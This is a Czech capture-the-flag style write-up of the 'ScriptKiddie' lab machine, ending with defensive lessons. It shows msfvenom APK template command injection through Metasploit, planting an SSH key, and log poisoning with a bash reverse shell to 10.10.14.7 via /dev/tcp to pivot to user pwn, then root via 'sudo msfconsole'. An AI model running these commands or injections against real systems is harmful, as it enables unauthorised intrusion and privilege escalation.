---
layout: post
author: Tomáš Matějíček
title: "ScriptKiddie"
date: 2021-01-11
tags: linux command-injection ssh sudo exploit enumeration
---
## Úvod a kontext

ScriptKiddie je stroj o špatně zabalené automatizaci bezpečnostních nástrojů. Webová služba na portu `5000` nabízela obsluhu kolem `msfvenom` a právě ta otevřela první shell. Druhá fáze pak ukázala jiný, ale stejně typický problém: pomocný skript zpracovávající logy pod jiným uživatelem. Právě tento druh trust boundary rozebírám i v článku [Logy jako útoková plocha](/techniky/logy-jako-utokova-plocha).

Nejde tedy o jeden exploit, ale o dva různé druhy command injection. Nejprve v aplikaci, která pracuje s APK šablonou pro `msfvenom`, a potom v interním workflow nad souborem `hackers`.

## Počáteční průzkum

### Vyhledání otevřených portů

Síťový průzkum byl úsporný. Vedle SSH běžela jen webová služba na portu `5000`.

```bash
ports=$(nmap -p- -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//)
echo $ports
nmap -p $ports -A -sC -sV -v $IP
```

```text
22/tcp open  ssh
5000/tcp open  http
```

Taková kombinace naznačuje jednoduchý jednoúčelový webový nástroj. V tomhle případě se potvrdilo, že souvisí s Metasploit frameworkem.

## Analýza zjištění

### `msfvenom` APK template command injection

`searchsploit` rychle ukázal relevantní zranitelnost:

```bash
searchsploit msfvenom
```

```text
Metasploit Framework 6.0.11 - msfvenom APK template command injection
```

To je důležité číst přesně. Chyba není v samotném Android APK, ale v tom, jak aplikace předává uživatelskou šablonu nástroji `msfvenom`. Pokud šablona skončí v shell příkazu bez bezpečného escapování, útočník dostane příkazové vykonání na hostu.

## Získání přístupu

### První shell jako `kid`

Praktický exploit šel spustit přímo z Metasploitu. Jak `msfconsole`, tak `msfvenom` v podobných situacích rozebírám i samostatně v článku [Metasploit: msfconsole a msfvenom](/nastroje/metasploit-msfconsole-a-msfvenom):

```text
use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
set lhost 10.10.14.7
set lport 4444
exploit
```

Po uploadu škodlivé APK šablony se vrátil reverse shell v kontextu uživatele `kid`. Pro další práci dávalo smysl hned přidat vlastní SSH klíč a přejít na stabilní přístup:

```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
echo "ssh-rsa __CENSORED__ hack@t" >> ~/.ssh/authorized_keys
ssh kid@$IP
```

Tím se uzavřela první fáze: webová aplikace poskytla shell jako `kid` a bylo možné potvrdit `user.txt`.

## Eskalace oprávnění

### Log poisoning proti uživateli `pwn`

Další posun nevedl přes `sudo`, ale přes logovací soubor:

```bash
echo "     ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'    #" >> /home/kid/logs/hackers
```

To dává smysl jen tehdy, pokud někdo jiný tento soubor automaticky zpracovává nedostatečně bezpečně. Přesně to se zde dělo. Proces běžící pod účtem `pwn` bral obsah `hackers` a předával ho shellu takovým způsobem, že vložený `; ... #` příkaz se vykonal při dalším zpracování logu.

Výsledkem byl další reverse shell, tentokrát jako `pwn`.

### `sudo msfconsole`

Jakmile byl k dispozici účet `pwn`, lokální oprávnění ukázala rozhodující pravidlo:

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/msfconsole
```

To je v praxi téměř přímá delegace roota. `msfconsole` není pasivní binárka, ale interaktivní konzole s možností spouštět lokální příkazy a pracovat s Ruby kódem. Spuštění:

```bash
sudo msfconsole
```

tedy znamená plný root kontext, ze kterého už šlo přečíst `root.txt`.

## Shrnutí klíčových poznatků

- Foothold vznikl z command injection v obsluze `msfvenom` na portu `5000`, nikoli z obecné chyby SSH nebo systému.
- Přechod z `kid` na `pwn` otevřelo další nebezpečné zpracování uživatelského vstupu, tentokrát nad souborem `/home/kid/logs/hackers`.
- Root část nebyla o exploitu jádra. Rozhodující byla chyba v delegaci práv: `sudo msfconsole`.

## Co si odnést do praxe

- Webové obaly kolem bezpečnostních nástrojů jsou stejně nebezpečné jako jakýkoli jiný command runner. Pokud přijímají šablony nebo argumenty od uživatele, musí pracovat bez shell injection.
- Logy a pracovní soubory sdílené mezi různými účty jsou citlivé i tehdy, když nejde o tajemství. Jakmile je někdo pod vyšším účtem automaticky parsuje nebo vykonává nad nimi příkazy, stávají se pivot bodem.
- `sudo` nad interaktivní konzolí typu `msfconsole` nebo podobným frameworkem není omezené oprávnění. V praxi jde o plný root shell a má se tak i auditovat.
